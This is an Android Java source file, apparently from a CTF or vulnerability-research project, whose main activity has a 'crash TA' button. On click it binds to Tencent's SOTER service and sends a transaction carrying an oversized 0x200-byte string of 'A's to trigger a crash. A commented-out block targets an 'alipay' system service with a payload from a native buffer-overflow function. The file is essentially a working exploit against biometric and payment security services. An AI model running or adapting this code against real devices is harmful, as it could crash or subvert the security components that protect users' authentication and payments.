package com.lake.ctf;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText; import android.widget.LinearLayout;
import android.widget.TextView;
import android.util.Log;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;

import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {

    public native byte[] triggerBufov();

    // Load the native library
    static {
        System.loadLibrary("ohgreat");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create a vertical LinearLayout
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);

        // Create a TextView for displaying results
        TextView textView = new TextView(this);
        textView.setText("this UI follows swiss style");

        // Create a TextInput (EditText)
        //EditText editText = new EditText(this);
        //editText.setHint("Enter flag:");

        // Create a Button
        Button button = new Button(this);
        button.setText("crash TA");


        // Set the button click listener
        button.setOnClickListener(v -> {
            try {
					Intent intent = new Intent("com.tencent.soter.soterserver.ISoterService");
					intent.setPackage("com.tencent.soter.soterserver");

					ServiceConnection conn = new ServiceConnection() {
						@Override
						public void onServiceConnected(ComponentName name, IBinder service) {
							Log.i("MYAPP", "service connected!!!");
							Parcel data = Parcel.obtain();
							Parcel reply = Parcel.obtain();
							data.writeInterfaceToken("com.tencent.soter.soterserver.ISoterService");	
							data.writeInt(69);
							int length = 0x200;
							StringBuilder sb = new StringBuilder(length);
							for (int i = 0; i < length; i++) {
								sb.append('A');
							}
							String str = sb.toString();
							data.writeString(str);
							try {
								// write any arguments into "data" if your service expects them
								service.transact(5, data, reply, 0); // command id = 1
								// optionally read reply data:
								// reply.readXXX();
							} catch (RemoteException e) {
								e.printStackTrace();
							} finally {
								data.recycle();
								reply.recycle();
								MainActivity.this.unbindService(this);
							}
						}

						@Override
						public void onServiceDisconnected(ComponentName name) {}
					};

					MainActivity.this.bindService(intent, conn, Context.BIND_AUTO_CREATE);
				/*
                Class[] cArg = new Class[1];
                cArg[0] = String.class;
                Class sm = Class.forName("android.os.ServiceManager");
                Method getService = sm.getMethod("getService", cArg);

                IBinder binder = (IBinder)getService.invoke(null, "alipay");
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();

                byte[] payload = triggerBufov();

                data.writeInterfaceToken("android.hardware.alipay.IAlipayService");
                data.writeByteArray(payload);
                binder.transact(1, data, reply, 0);*/

            }catch (Exception e){
                Log.e("MYAPP", "exception", e);
            }


        });

        // Add views to the layout
        //layout.addView(editText);
        layout.addView(button);
        layout.addView(textView);

        // Set the layout as the content view
        setContentView(layout);
    }

}
